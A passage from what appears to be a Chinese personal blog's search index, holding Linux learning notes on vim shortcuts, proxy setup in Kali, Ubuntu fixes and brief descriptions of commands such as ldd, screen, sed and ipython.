选中&#123;&#125;中间内容，包括&#123;&#125;<br>选中()中间内容<br><span class="hljs-keyword">vi</span>&lt; 选中&lt;&gt;中间内容<br><span class="hljs-keyword">vi</span>[ 选中[]中间内容<br>vit 选中中间的内容<br><span class="hljs-keyword">vi</span><span class="hljs-string">&quot; 选中&quot;</span>中间内容<br><span class="hljs-keyword">vi</span><span class="hljs-string">&#x27; 选中&#x27;</span>中间的内容、<br><br>块选择:<br>vis 选中一个句子<br>vib 选中一个block<br>viw 选中一个单词<br>vip 选中一个段落<br></code></pre></div></td></tr></table></figure><ul><li>自动提示： <code>&lt;C-n&gt;</code> 和 <code>&lt;C-p&gt;</code> </li></ul></li><li><p>Kali成功登上google, 使用chrome的代理就成. 算是搞明白一点代理是怎么回事了, Kali没有全局代理只能再需要的软件里面设置代理, 命令行程序要用代理要装proxytrain</p></li><li></li></ul><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><ul><li>ubuntu虽然任务栏不好用, 但是有快捷键挺舒服的, 继续记!</li><li>ubuntu sudo命令延时很长<a href="https://blog.csdn.net/kiritow/article/details/80687036">解决办法</a> </li><li>更新<a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">ubuntu源</a> </li><li>linux终端<a href="http://www.360doc.com/content/16/0615/15/7044580_567984505.shtml">快捷键</a> </li><li>通过增加快捷键绑定解决vim终端中无法使用方向键的问题</li><li>init 0重启发现挂载失败了, 之前那个命令也不管用了, 只能倒回上一个快照继续, 还好博客都是用的共享文件夹.<br>不说了, 快照再次救我一命.<ul><li>找到了解决办法, 要给普通用户权限访问</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot; &quot; | sudo -S vmhgfs-fuse -o allow_other ......<br></code></pre></div></td></tr></table></figure><h2 id="各种命令-软件包"><a href="#各种命令-软件包" class="headerlink" title="各种命令+软件包"></a>各种命令+软件包</h2><ul><li><p><em>ldd</em>  <em>strace(刚刚装的)</em> <em>head打印前n行</em>  <em>du显示文件大小</em>   <em>ps打印进程信息</em>  </p><ul><li>ldd: print shared object dependencies</li><li>ps aux  –  BSD参数风格</li></ul></li><li><p>Linux下<code>!</code>的<a href="https://www.cnblogs.com/wxywxy/p/7756596.html">用法</a>, 主要是传递最后执行的命令的参数，以方便的运行新命令(非常实用)</p></li><li><p><a href="http://c.biancheng.net/linux/ln.html">ln命令|symbolic_link</a> </p></li><li><p>scp&amp; mkdir &amp; mv(linux中重命名的唯一方法)</p><ul><li>scp: copy files between hosts on a network</li></ul></li><li><p><em>screen</em>: window manager, 好多快捷键, 复制了一份<a href="https://gist.github.com/joaopizani/2718397">.screenrc</a>, 还挺有趣的.</p><ul><li>screen这玩意儿也太强了.</li><li><code>Ctrl + A + [</code>进入copy模式才能使用滚轮或者Ctrl+F/B等等来翻页</li></ul></li><li><p>装了一个httping玩一玩</p></li><li><p>看到一个cscope包可以用来解析C/C++项目, 有空再研究怎么玩</p></li><li><p>vim-gtk是vim的一个GUI版本, 装了之后才能vim -g</p></li><li><p>新命令: tput好像是用一个通用命令做参数,  然后在当前终端的数据库中找到正确的命令并发送</p></li><li><p><strong>ipython: System shell with !</strong> interactive Python也挺神奇的, 具体见pwn-modulesj里的帮助.</p><ul><li><a href="https://blog.51cto.com/essun/1712322">ipython用法</a> </li></ul></li><li><p>发现grep有拓展正则和普通正则的区别, 又是一大堆东西, 有缘再看吧.</p></li><li><p>新东西: <strong>sed</strong>, stream editor.  还有一个ed, 根本不知道怎么用. <del>这东西这两天把菜鸟教程上所有的命令全看一边就行了</del> 上面没有.<br><em><strong>rev nl</strong></em>  perror[[]]</p><ul><li>命令或许可以写在思维导图里, md肯定是不太行的.</li><li>真不错, 用了sed来改c.c中的题目标号, 再方便一点.</li></ul></li><li><p>装了一个rappel. 改成了<code>rap</code>直接执行.</p></li><li></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
